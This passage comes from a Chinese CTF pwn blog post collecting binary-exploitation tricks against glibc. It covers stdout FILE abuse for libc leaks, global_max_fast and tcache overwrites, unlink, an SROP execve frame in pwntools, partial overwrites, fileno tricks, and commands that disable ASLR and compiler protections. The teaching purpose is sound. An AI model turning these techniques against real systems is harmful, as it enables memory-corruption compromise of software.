+    fp<span class="token operator">-></span>_offset <span class="token operator">=</span> _IO_pos_BAD<span class="token punctuation">;</span>
+  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_end <span class="token operator">!=</span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+      _IO_off64_t new_pos
+    <span class="token operator">=</span> <span class="token function">_IO_SYSSEEK</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_write_base <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_read_end<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>new_pos <span class="token operator">==</span> _IO_pos_BAD<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+      fp<span class="token operator">-></span>_offset <span class="token operator">=</span> new_pos<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  ## 调用函数输出输出缓冲区
+  count <span class="token operator">=</span> <span class="token function">_IO_SYSWRITE</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> to_do<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+  <span class="token keyword">return</span> count<span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>需要满足的条件为</p>
+<ol>
+<li>设置<code>_flag &amp;~ _IO_NO_WRITES</code>即<code>_flag &amp;~ 0x8</code>。</li>
+<li>设置<code>_flag &amp; _IO_CURRENTLY_PUTTING</code>即<code>_flag | 0x800</code></li>
+<li>设置<code>_fileno</code>为1。</li>
+<li>设置<code>_IO_write_base</code>指向想要泄露的地方；<code>_IO_write_ptr</code>指向泄露结束的地址。</li>
+<li>设置<code>_IO_read_end</code>等于<code>_IO_write_base</code>或设置<code>_flag &amp; _IO_IS_APPENDING</code>即<code>_flag | 0x1000</code>。</li>
+<li>设置<code>_IO_write_end</code>等于<code>_IO_write_ptr</code>（非必须）。</li>
+</ol>
+<p>另外，在<code>_IO_new_file_overflow</code>函数中，有</p>
+<pre class=" language-c"><code class="language-c"><span class="token function">_IO_do_write</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">,</span>
+             f<span class="token operator">-></span>_IO_write_ptr <span class="token operator">-</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>我们在做无泄漏的堆题时，改stdout结构体开头为<code>p64(flag)+p64(0)*3+p8(0)</code>,其中p8(0)对应修改的就是<code>_IO_write_base</code>，将其改小一些，就会输出<code>_IO_write_base</code>及其附近的一堆地址来达到泄漏libc地址的目的。</p>
+<p>记录一下flag的构造</p>
+<pre><code>flag=0
+flag&amp;=~8
+flag|=0x800
+flag|=0x8000
+在printf函数中会调用_IO_acquire_lock_clear_flags2 (stdout)来获取lock从而继续程序，如果没有_IO_USER_LOCK标志的话，程序会一直在循环，而_IO_USER_LOCK定义为#define _IO_USER_LOCK 0x8000，因此需要设置flag|=0x8000才能够使exp顺利进行</code></pre><h2 id="0x13-global-max-fast相关利用"><a href="#0x13-global-max-fast相关利用" class="headerlink" title="0x13.global_max_fast相关利用"></a>0x13.global_max_fast相关利用</h2><p><code>global_max_fast</code>规定了fastbin的最大大小，64位机器下，默认为0x80.</p>
+<p>一般通过unsortedbin attack复写global_max_fast为main_arena的地址，这样后续我们释放多大的堆块都会被认为是fastbin，会根据fastbin的序号放到对应的地址中。如果我们能申请并释放很大的堆块的话，且计算好堆块的size，就能够在任意地址写入堆块的地址。通过这种任意地址写堆地址的方式，我们可以修改<code>_io_list_all</code>为一个堆块的地址，并事先在堆块中伪造好FILE结构体，类似于house of orange。</p>
+<p>或者，有些题目不允许分配fastbin，例如规定了申请的chunk大小大于0x80，使用了mallopt(1,0)来限制了fastbin大小为0，也就是没有fastbin。这种情况下可以复写global_max_fast为main_arena，这样就可以重新使用fastbin了。</p>
+<h2 id="0x14-unlink"><a href="#0x14-unlink" class="headerlink" title="0x14.unlink"></a>0x14.unlink</h2><p>原理不多说</p>
+<p>构造方式为</p>
+<p>假设有两个chunk，chunk1和chunk2，在chunk1中伪造一个fake_chunk，fake_chunk的fd为&amp;chunk1_addr-0x18，bk为&amp;chunk1_addr-0x10，还需要将chunk2的inuse位置为0，最后再free掉chunk2，这样chunk1的指针就会转移到&amp;chunk1_addr-0x18处，我们就能够控制堆的管理地址了。</p>
+<h2 id="0x15-SROP"><a href="#0x15-SROP" class="headerlink" title="0x15.SROP"></a>0x15.SROP</h2><p>目前ctf比赛中单纯的srop很少见，多用于堆题开启了沙箱，需要用orw读取flag的情况</p>
+<p>pwntools中集成了SROP的伪造模块，使用方式如下</p>
+<pre class=" language-python"><code class="language-python">sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> constants<span class="token punctuation">.</span>SYS_execve <span class="token comment" spellcheck="true">#系统调用号</span>
+sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0x120</span>  <span class="token comment" spellcheck="true"># "/bin/sh" 's addr 参数一</span>
+sigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x0</span> <span class="token comment" spellcheck="true">#参数二</span>
+sigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x0</span> <span class="token comment" spellcheck="true">#参数三</span>
+sigframe<span class="token punctuation">.</span>rsp <span class="token operator">=</span> stack_addr <span class="token comment" spellcheck="true">#执行完系统调用后要跳转的地址</span>
+sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_ret <span class="token comment" spellcheck="true">#syscall ret的地址</span></code></pre>
+<p>使用前还需声明目标架构</p>
+<h2 id="0x16-partial-overwrite"><a href="#0x16-partial-overwrite" class="headerlink" title="0x16.partial overwrite"></a>0x16.partial overwrite</h2><p>当程序开启pie和canary时，如果程序的功能是read-printf这种类型，且能运行两次或者多次，第一次泄露canary，第二次覆盖函数返回地址的末尾两位，如果是mian函数的返回地址那就是<code>__libc_start_main</code>，复写末位两位可以使程序重新运行，但canary不会变，这样就能够泄露libc地址并且rop了。</p>
+<h2 id="0x17-各种保护"><a href="#0x17-各种保护" class="headerlink" title="0x17.各种保护"></a>0x17.各种保护</h2><p>在ctfpwn中一般面对的是四种保护机制，分别为RELRO、Canary、NX和PIE</p>
+<p>这四种保护的开启方式如下</p>
+<h3 id="1-RELRO"><a href="#1-RELRO" class="headerlink" title="1.RELRO"></a>1.RELRO</h3><pre><code>gcc -o demo demo.c                        // 默认情况下，是Partial RELRO
+gcc -z norelro -o demo demo.c            // 关闭，即No RELRO
+gcc -z lazy -o demo demo.c                // 部分开启，即Partial RELRO
+gcc -z now -o demo demo.c                // 全部开启，即FULL RELRO</code></pre><p>partial RELRO的情况下，GOT表是可写的(.got.plt)；而在FULL RELRO的情况下，GOT表不可写，lazy resolution 是被禁止的，所有导入的符号都在 startup time 被解析。</p>
+<h3 id="2-Canary"><a href="#2-Canary" class="headerlink" title="2.Canary"></a>2.Canary</h3><pre><code>gcc -o demo demo.c                        // 默认情况下，不开启Canary保护
+gcc -fno-stack-protector -o demo demo.c  //禁用栈保护
+gcc -fstack-protector -o demo demo.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码
+gcc -fstack-protector-all -o demo demo.c //启用堆栈保护，为所有函数插入保护代码</code></pre><p>这种保护会在rbp上方添加一个cookie，32位机器下为4字节，64位机器下为8字节，且末尾为空字符</p>
+<p>当栈溢出覆盖了canary后，就会调用___stack_chk_fail来终止程序</p>
+<h3 id="3-NX"><a href="#3-NX" class="headerlink" title="3.NX"></a>3.NX</h3><pre><code>gcc -o demo demo.c                    // 默认情况下，开启NX保护
+gcc -z execstack -o demo demo.c        // 禁用NX保护
+gcc -z noexecstack -o demo demo.c    // 开启NX保护</code></pre><p>NX即No-eXecute（不可执行）的意思,windows上称为DEP，无法在栈上执行shellcode</p>
+<h3 id="4-PIE"><a href="#4-PIE" class="headerlink" title="4.PIE"></a>4.PIE</h3><p>需要在ASLR开启后PIE才会生效</p>
+<p>ASLR：内存地址随机化机制（address space layout randomization)</p>
+<pre><code>0 - 表示关闭进程地址空间随机化。
+1 - 表示将mmap的基址，stack和vdso页面随机化。
+2 - 表示在1的基础上增加栈（heap）的随机化。</code></pre><pre><code>sudo -s echo 0/1/2 &gt; /proc/sys/kernel/randomize_va_space</code></pre><p>开启PIE保护</p>
+<pre><code>gcc -o demo demo.c                // 默认情况下，不开启PIE
+gcc -fpie -pie -o demo demo.c        // 开启PIE，此时强度为1
+gcc -fPIE -pie -o demo demo.c        // 开启PIE，此时为最高强度2
+gcc -fpic -o demo demo.c        // 开启PIC，此时强度为1，不会开启PIE
+gcc -fPIC -o demo demo.c        // 开启PIC，此时为最高强度2，不会开启PIE</code></pre><p>PIE随机化了ELF装载内存的基址（.text、plt、got、data等共同的基址）</p>
+<h2 id="0x18-abs函数溢出点"><a href="#0x18-abs函数溢出点" class="headerlink" title="0x18.abs函数溢出点"></a>0x18.abs函数溢出点</h2><pre><code>abs函数接收4字节有符号int数，当传入0x80000000时，其返回结果仍然是0x80000000，由于4字节int正数将无法表示这么大，因此，其值是一个负数</code></pre><h2 id="0x19-指针未初始化漏洞"><a href="#0x19-指针未初始化漏洞" class="headerlink" title="0x19.指针未初始化漏洞"></a>0x19.指针未初始化漏洞</h2><h3 id="1-rec-33c3-2016"><a href="#1-rec-33c3-2016" class="headerlink" title="1.rec_33c3_2016"></a>1.rec_33c3_2016</h3><p>在功能5中</p>
+<p><a href="https://imgchr.com/i/y6Ds4x" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/15/y6Ds4x.png" alt="y6Ds4x.png"></a></p>
+<p>当v2==0时没有给v1赋值，然后调用了v1，如果我们能够控制栈上的数据就能够达成任意函数执行</p>
+<p>在功能2中</p>
+<p><a href="https://imgchr.com/i/y6rZZ9" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/15/y6rZZ9.png" alt="y6rZZ9.png"></a></p>
+<p>进行累加操作的时候，首先将栈压低了0x8的空间，然后又push了两个值入栈，所以这一系列操作相当于把栈压低了0x10，随后又将栈升高了0x8的空间，这样一来，每累加一次就把栈压低了0x8，所以只需要计算出当前栈和功能5中的v1的栈的距离就能够将esp挪过去，接着再利用这个累加功能往v1中写rop就行。</p>
+<h3 id="2-ciscn-2019-ne-6"><a href="#2-ciscn-2019-ne-6" class="headerlink" title="2.ciscn_2019_ne_6"></a>2.ciscn_2019_ne_6</h3><p><a href="https://imgchr.com/i/y6rDsg" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/15/y6rDsg.png" alt="y6rDsg.png"></a></p>
+<p>在delete功能中，即使ptr并不满足条件，也依然会判断ptr是否有值，有值的话依然会将其free，且清空堆指针的操作是在if代码块内部，这样的话如果我们能够控制ptr的值就能够任意地址free。</p>
+<p>如何控制ptr，需要从free的上一个函数入手</p>
+<p><a href="https://imgchr.com/i/y6y3Ed" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/15/y6y3Ed.png" alt="y6y3Ed.png"></a></p>
+<p>在进行free之前还有一个函数要执行，这个函数能够写入一些数据</p>
+<p><a href="https://imgchr.com/i/y6yG4I" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/15/y6yG4I.png" alt="y6yG4I.png"></a></p>
+<p>调试后能够发现，在栈中通过s写入0x28的数据刚好能够覆盖ptr，因此我们可以泄露出堆地址，先正常free一遍，然后利用这个漏洞再次free，就能够造成double free。</p>
+<p>在这两题中，IDA很贴心的将未初始化的指针都用不同的颜色标注了出来，tql。</p>
+<h2 id="0x1a-ELF文件中的一些段"><a href="#0x1a-ELF文件中的一些段" class="headerlink" title="0x1a.ELF文件中的一些段"></a>0x1a.ELF文件中的一些段</h2><p>.bss</p>
+<p>​    包含目标文件中未初始化的全局变量。一般情况下，可执行程序在开 始运行的时候，系统会把这一段内容清零。但是，在运行期间的 bss 段是由系统初 始化而成的，在目标文件中.bss 节并不包含任何内容，其长度为 0</p>
+<p>.data/.data1 </p>
+<p>​    这两个节用于存放程序中被初始化过的全局变量。在目标文件中，它们是占 用实际的存储空间的，与.bss 节不同。</p>
+<p>.debug</p>
+<p>​    本节中含有调试信息，内容格式没有统一规定。所有以”.debug”为前缀的节名 字都是保留的。</p>
+<p>.dynamic </p>
+<p>​    本节包含动态连接信息</p>
+<p>.dynstr </p>
+<p>​    此节含有用于动态连接的字符串，一般是那些与符号表相关的名字</p>
+<p>.dynsym</p>
+<p>​    此节含有动态连接符号表。</p>
+<p>.fini </p>
+<p>​    此节包含进程终止时要执行的程序指令。当程序正常退出时，系统会执行这 一节中的代码。</p>
+<p>.got </p>
+<p>​    此节包含全局偏移量表。</p>
+<p>.plt </p>
+<p>​    此节包含函数连接表。</p>
+<p>.init </p>
+<p>​    此节包含进程初始化时要执行的程序指令。当程序开始运行时，系统会在进 入主函数之前执行这一节中的代码。</p>
+<p>rodata/.rodata1 </p>
+<p>​    本节包含程序中的只读数据，在程序装载时，它们一般会被装入进程空间中 那些只读的段中去。</p>
+<p>.shstrtab </p>
+<p>​    本节是“节名字表”，含有所有其它节的名字。</p>
+<p>.strtab </p>
+<p>​    本节用于存放字符串，主要是那些符号表项的名字。</p>
+<p>.symtab </p>
+<p>​    本节用于存放符号表。</p>
+<p>.text </p>
+<p>​    本节包含程序指令代码</p>
+<h2 id="0x1b-巧用fileno"><a href="#0x1b-巧用fileno" class="headerlink" title="0x1b.巧用fileno"></a>0x1b.巧用fileno</h2><h3 id="1-d3ctf-2019-ezfile"><a href="#1-d3ctf-2019-ezfile" class="headerlink" title="1.d3ctf_2019_ezfile"></a>1.d3ctf_2019_ezfile</h3><p><a href="https://imgchr.com/i/yIVfvn" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yIVfvn.png" alt="yIVfvn.png"></a></p>
+<p>add功能最大只能分配0x18的chunk</p>
+<p><a href="https://imgchr.com/i/yIVqC4" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yIVqC4.png" alt="yIVqC4.png"></a></p>
+<p>delete功能存在uaf</p>
+<p><a href="https://imgchr.com/i/yIVXvR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yIVXvR.png" alt="yIVXvR.png"></a></p>
+<p>encrypt功能存在栈溢出</p>
+<p>程序没有show功能，且程序中没有调用puts、printf一类的的函数，无法利用io_file泄露libc地址。</p>
+<p>利用方法为：</p>
+<p>首先利用uaf修改IO_2_1_stdin的fileno参数为3</p>
+<p>通过栈溢出的漏洞，partial overwrite返回地址到这</p>
+<p><a href="https://imgchr.com/i/yIZQPg" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yIZQPg.png" alt="yIZQPg.png"></a></p>
+<p>此时open函数的rdi来源于这里</p>
+<p><a href="https://imgchr.com/i/yIZUaT" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yIZUaT.png" alt="yIZUaT.png"></a></p>
+<p>rdi来源于rax，rax来源于seed，而seed是我们可以控制的，所以open函数的rdi也就是我们可以控制的，于是将seed设置为./flag，fd=open(“./flag”,0)=3，后面调用scanf的时候</p>
+<p><a href="https://imgchr.com/i/yIZ5zd" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yIZ5zd.png" alt="yIZ5zd.png"></a></p>
+<p>就会输出flag的内容。</p>
+<h3 id="2-ciscn-final-2"><a href="#2-ciscn-final-2" class="headerlink" title="2.ciscn_final_2"></a>2.ciscn_final_2</h3><p><a href="https://imgchr.com/i/yIe0Tf" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yIe0Tf.png" alt="yIe0Tf.png"></a></p>
+<p>这题在初始化函数中打开了flag，并且将其fd修改为了666，后面又开启了沙箱</p>
+<p><a href="https://imgchr.com/i/yIeH1J" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yIeH1J.png" alt="yIeH1J.png"></a></p>
+<p>在delete函数中存在uaf，且是通过bool这个全局变量来判断是否要free</p>
+<p><a href="https://imgchr.com/i/yIm99e" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yIm99e.png" alt="yIm99e.png"></a></p>
+<p>但bool这一个全局变量却对应着两个类型的chunk，因此可以造成double free。</p>
+<p>但由于能输入的数据都是数字，所以没办法通过正常的方法来getshell，因此需要利用flag的fd</p>
+<p>利用uaf修改IO_2_1_stdin的fileno为666，在利用byebye功能中的scanf功能，即可输出flag</p>
+<p><a href="https://imgchr.com/i/yImBuR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/20/yImBuR.png" alt="yImBuR.png"></a></p>
+<h2 id="0x1c-从RCTF-no-write中学到的一些知识"><a href="#0x1c-从RCTF-no-write中学到的一些知识" class="headerlink" title="0x1c.从RCTF no_write中学到的一些知识"></a>0x1c.从RCTF no_write中学到的一些知识</h2><p>1.<code>__libc_start_main</code>会在内存内写入<code>initial</code>,<code>exit_funcs_lock</code>的地址。</p>
+<p>2.在<code>__do_global_dtors_aux</code>中有一条gadget：</p>
+<pre class=" language-assembly"><code class="language-assembly">0x4005e8 <__do_global_dtors_aux+24>:    add    DWORD PTR [rbp-0x3d],ebx
+0x4005eb <__do_global_dtors_aux+27>:    nop    DWORD PTR [rax+rax*1+0x0]
+0x4005f0 <__do_global_dtors_aux+32>:    repz ret </code></pre>
+<p>结合万能gadget可以做到往任意地址写入一个值</p>
+<p>3.在strncmp中会调用<code>__strncmp_sse42</code>函数，这个函数的的参数和strncmp一样，地址可以在strncmp中查看</p>
+<pre class=" language-assembly"><code class="language-assembly">0x7ffff7a81d19 <strncmp+25>:    lea    rax,[rip+0xe77f0]        # 0x7ffff7b69510 __strncmp_sse42的地址
+0x7ffff7a81d20 <strncmp+32>:    je     0x7ffff7a81d37 <strncmp+55></code></pre>
+<h2 id="0x1d-glibc2-32中的一点变化"><a href="#0x1d-glibc2-32中的一点变化" class="headerlink" title="0x1d.glibc2.32中的一点变化"></a>0x1d.glibc2.32中的一点变化</h2><p>在glibc2.32中对tcache的取出和放入时进行了处理，称为<strong>safe-linking</strong>(异或加密)，具体代码如下</p>
+<pre class=" language-c"><code class="language-c"><span class="token function">tcache_put</span> <span class="token punctuation">(</span>mchunkptr chunk<span class="token punctuation">,</span> size_t tc_idx<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>tcache_entry <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token comment" spellcheck="true">/* Mark this chunk as "in the tcache" so the test in _int_free will
+     detect a double free.  */</span>
+  e<span class="token operator">-></span>key <span class="token operator">=</span> tcache<span class="token punctuation">;</span>
+
+  e<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token function">PROTECT_PTR</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>e<span class="token operator">-></span>next<span class="token punctuation">,</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>
+  <span class="token operator">++</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>tcache的fd位置会被赋值为<code>PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx])</code></p>
+<p><code>PROTECT_PTR</code> 的实现如下</p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> PROTECT_PTR(pos, ptr) \
+  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))</span>
+<span class="token macro property">#<span class="token directive keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></code></pre>
+<p>会将pos右移12位之后再和ptr抑或，pos实际上就是要free的堆的地址，ptr则是对应链表的尾部</p>
+<p>结合一个小程序来看看具体现象</p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>a<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>b<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>free(a)之后</p>
+<p><a href="https://imgtu.com/i/c2fhiq" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/04/15/c2fhiq.png" alt="c2fhiq.png"></a></p>
+<p>fd指针为<code>0x0000000555555757</code></p>
+<p>由<code>0x5555557572a0&gt;&gt;12&amp;0</code>计算得来，在free(a之前，因为pos为0x5555557572a0，而tcache-&gt;entries[tc_idx]为0</p>
+<p>free(a)之后，tcache-&gt;entries[tc_idx]为0x5555557572a0，当free(b)时，pos为0x5555557572f0，ptr为0x5555557572a0，所以此时的e-&gt;next会被赋值为<code>0x5555557572f0&gt;&gt;12^0x5555557572a0=0x00005550002025f7</code></p>
+<p><a href="https://imgtu.com/i/c2oigP" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/04/15/c2oigP.png" alt="c2oigP.png"></a></p>
+<p>safe-linking的实现大概就是这样</p>
+<h2 id="0x1e-tcache结构体"><a href="#0x1e-tcache结构体" class="headerlink" title="0x1e.tcache结构体"></a>0x1e.tcache结构体</h2><p>上面既然记录了tcache相关的一些知识，就顺便再记录一下tcache相关的结构体</p>
+<p>依然拿2.32举例</p>
+<h3 id="1-typedef-struct-tcache-entry"><a href="#1-typedef-struct-tcache-entry" class="headerlink" title="1.typedef struct tcache_entry"></a>1.typedef struct tcache_entry</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> tcache_entry
+<span class="token punctuation">{</span>
+  <span class="token keyword">struct</span> tcache_entry <span class="token operator">*</span>next<span class="token punctuation">;</span>
+  <span class="token comment" spellcheck="true">/* This field exists to detect double frees.  */</span>
+  <span class="token keyword">struct</span> tcache_perthread_struct <span class="token operator">*</span>key<span class="token punctuation">;</span>
+<span class="token punctuation">}</span> tcache_entry<span class="token punctuation">;</span></code></pre>
+<p>这个结构体就是我们一直在攻击的tcache的实现，应该说一目了然，next指针就是指向下一个tcache，key指针防止double free，存放着tcache_perthread_struct的地址</p>
+<h3 id="2-tcache-perthread-struct"><a href="#2-tcache-perthread-struct" class="headerlink" title="2.tcache_perthread_struct"></a>2.tcache_perthread_struct</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> tcache_perthread_struct
+<span class="token punctuation">{</span>
+  uint16_t counts<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>
+  tcache_entry <span class="token operator">*</span>entries<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> tcache_perthread_struct<span class="token punctuation">;</span></code></pre>
+<p>这个堆块结构体用来管理tcache</p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property"># <span class="token directive keyword">define</span> TCACHE_MAX_BINS        64</span></code></pre>
+<p>两个成员分别为一个uint16类型的数组，大小为64；以及一个指针数组，大小依然是64；</p>
+<p>counts数组用来表示某个大小的tcache的数量，比如有两个0x20的tcache，那么counts[0]即为2；entries这个数组用来存储某条tcache链表的链表头。</p>
+<p>和其他bins的不一样，tcache_perthread_struct由malloc分配空间，也就是说tcache_perthread_struct这个结构体的位置在heap段，glibc2.32中的大小为0x290，其中counts数组大小为0x40*2=0x80，2.27中大小为0x250.</p>
+<p>这里顺带再介绍一下<code>TCACHE_MAX_BINS</code>的攻击方式。</p>
+<p>前面说了，counts数组用来记录tcache的数量，在__libc_malloc函数中有如下代码</p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_bins
+      <span class="token operator">&amp;&amp;</span> tcache
+      <span class="token operator">&amp;&amp;</span> tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+      <span class="token keyword">return</span> <span class="token function">tcache_get</span> <span class="token punctuation">(</span>tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span></code></pre>
+<p>其中的tcache_bins就是TCACHE_MAX_BINS，如果tc_idx小于TCACHE_MAX_BINS并且有tcache且counts[tc_idx]数组不为空，就会调用tcache_get函数。</p>
+<p><code>TCACHE_MAX_BINS</code>的攻击方式和<code>global_max_fast</code>的攻击方式有相似之处，如果我们能将<code>TCACHE_MAX_BINS</code>修改成一个很大的值，那么<code>tcache_perthread_struct</code>这个结构体也会很大，可能会与我们的可控区域重合，我们在可控区域中的某个位置写入一个地址，如malloc_hook，然后再计算出这个位置对应的tcache大小，然后申请(前提是可以申请这么大的chunk并且count[tc_idx]对应的位置不为空)这么大的chunk，就会将malloc_hook分配给用户。</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lawliet.ren" rel="external nofollow noreferrer">Lock</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lawliet.ren/LawlietLW.github.io/2021/01/02/pwntrick/">https://lawliet.ren/LawlietLW.github.io/2021/01/02/pwntrick/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://lawliet.ren" target="_blank">Lock</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/LawlietLW.github.io/tags/trick/">
+                                    <span class="chip bg-color">trick</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
